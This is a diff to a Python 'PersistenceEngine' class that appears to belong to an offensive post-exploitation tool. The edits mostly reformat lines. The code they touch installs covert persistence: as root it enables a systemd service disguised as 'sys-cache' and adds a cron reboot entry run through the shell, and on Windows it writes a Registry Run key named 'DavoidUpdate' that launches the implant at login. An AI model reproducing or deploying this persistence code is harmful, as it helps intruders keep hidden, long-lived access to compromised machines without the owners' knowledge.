@@ -26,11 +26,14 @@ class PersistenceEngine:
             if os.getuid() == 0:
                 with open(service_path, "w") as f:
                     f.write(service_code)
-                subprocess.run(["systemctl", "enable", "sys-cache"], capture_output=True)
-                console.print("[bold green][+] Systemd Service established.[/bold green]")
-            
+                subprocess.run(
+                    ["systemctl", "enable", "sys-cache"], capture_output=True)
+                console.print(
+                    "[bold green][+] Systemd Service established.[/bold green]")
+
             subprocess.run(cron_cmd, shell=True)
-            console.print("[bold green][+] Cron reboot persistence established.[/bold green]")
+            console.print(
+                "[bold green][+] Cron reboot persistence established.[/bold green]")
         except Exception as e:
             console.print(f"[red][!] Linux persistence failed: {e}[/red]")
 
@@ -41,10 +44,13 @@ class PersistenceEngine:
             key = winreg.HKEY_CURRENT_USER
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, "DavoidUpdate", 0, winreg.REG_SZ, self.path)
-            console.print("[bold green][+] Windows Registry 'Run' key established.[/bold green]")
+                winreg.SetValueEx(reg_key, "DavoidUpdate", 0,
+                                  winreg.REG_SZ, self.path)
+            console.print(
+                "[bold green][+] Windows Registry 'Run' key established.[/bold green]")
         except Exception as e:
-            console.print(f"[red][!] Windows Registry persistence failed: {e}[/red]")
+            console.print(
+                f"[red][!] Windows Registry persistence failed: {e}[/red]")
 
     def run(self):
         console.print(f"[*] Deploying Persistence for: {self.path}")
@@ -53,4 +59,5 @@ class PersistenceEngine:
         elif self.is_windows:
             self.install_windows_registry()
         else:
-            console.print("[yellow][!] OS not supported for automated persistence.[/yellow]")
+            console.print(
+                "[yellow][!] OS not supported for automated persistence.[/yellow]")
